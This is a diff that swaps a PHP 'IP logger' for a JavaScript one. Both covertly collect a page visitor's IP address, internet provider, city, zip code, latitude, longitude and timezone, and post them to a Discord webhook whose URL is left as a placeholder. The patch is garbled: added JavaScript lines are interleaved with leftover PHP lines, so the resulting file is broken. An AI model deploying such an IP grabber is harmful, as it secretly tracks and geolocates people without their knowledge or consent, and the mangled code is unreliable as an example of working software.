@@ -1,4 +1,20 @@
-<?php
+// Paste your Discord Webhook API URL into Line 3: WEBHOOKURL => YOUR API URL
+
+var webHookUrl = "YOUR_WEBHOOK_URL_HERE";
+
+/*
+    Forked from: https://github.com/luisoos/IP-Log-To-Discord-Webhook
+    License: MIT
+*/
+
+const request = async () => { // Calling a "synchronous" fetch
+    const response = await fetch('https://ip-api.com/json/');
+    const data = await response.json();
+
+    // Declaring variables
+    var ip = data.query;
+
+    var provider = data.org + " (" + data.as + ")";<?php
 /*
  GitHub: https://github.com/Elyasuuuuu
  Last update : 29/03/2020
@@ -63,48 +79,44 @@ function getBrowser() {
 							'/Valve Steam GameOverlay/i'  =>  'Steam',
                             '/mobile/i'     =>  'Handheld Browser'
                         );
-    foreach ($browser_array as $regex => $value) { 
-        if (preg_match($regex, $user_agent)) {
-            $browser    =   $value;
-        }
+
+
+    var timezone = data.timezone;
+    var country = data.country;
+    var countryCode = data.countryCode.toLowerCase()
+    var region = data.region + " (" + data.regionName + ")";
+    var city = data.city;
+
+    var zip = data.zip;
+    var lat = data.lat;
+    var lon = data.lon;
+
+    // Open POST Request
+    var postRequest = new XMLHttpRequest();
+    postRequest.open("POST", webHookUrl);
+
+    postRequest.setRequestHeader('Content-type', 'application/json');
+
+    var params = {
+        username:   "IP Log",
+        avatar_url: "",
+        content:    "__**:globe_with_meridians: IP-Adress:**__ \n" 
+                    + "`" + ip + "`" + 
+                    "\n \n__**:telephone: Provider:**__ \n" 
+                    + provider + 
+                    "\n \n__**:map: Timezone:**__ \n" 
+                    + timezone + 
+                    "\n \n__**:flag_" + countryCode + ": Country and Region:**__ \n" 
+                    + country + " - " + region + 
+                    "\n \n__**:cityscape: Zip Code & City:**__ \n" 
+                    + zip + " " + city +
+                    "\n \n__**:round_pushpin: Location:**__ \n" 
+                    + "**Longitude:** " + lon + "\n"
+                    + "**Latitude:** " + lat
     }
-    return $browser;
+
+    postRequest.send(JSON.stringify(params));
+
 }
-$user_os        =   getOS();
-$user_browser   =   getBrowser();
-$time = date('Y-m-d H:i:s');
-require_once('script.php');
-$geoplugin = new geoPlugin();
-$geoplugin->locate();
 
-//<------------- Partie Graphique -> En Markdown donc balise discord.
-$make_json = json_encode(array ('content'=>                               
-"
-IP: {$geoplugin->ip}
-Os: $user_os
-Vanigator: $user_browser
-Datation: $time
-City: {$geoplugin->city}
-Region: {$geoplugin->region}
-Region Code: {$geoplugin->regionCode}
-Region Nom: {$geoplugin->regionName}
-DMA Code: {$geoplugin->dmaCode}
-Pays: {$geoplugin->countryName}
-Code pays: {$geoplugin->countryCode}
-Europeen ?: {$geoplugin->inEU}
-Latitude: {$geoplugin->latitude}
-Longitude: {$geoplugin->longitude}
-Accuracy (Miles): {$geoplugin->locationAccuracyRadius}
-Timezone: {$geoplugin->timezone}
-"
-));
-
-$exec = curl_init("$webhook"); 
-curl_setopt( $exec, CURLOPT_HTTPHEADER, array('Content-type: application/json'));
-curl_setopt( $exec, CURLOPT_POST, 1);
-curl_setopt( $exec, CURLOPT_POSTFIELDS, $make_json);
-curl_setopt( $exec, CURLOPT_FOLLOWLOCATION, 1);
-curl_setopt( $exec, CURLOPT_HEADER, 0);
-curl_setopt( $exec, CURLOPT_RETURNTRANSFER, 1);
-$response = curl_exec( $exec );
-?>
+request();
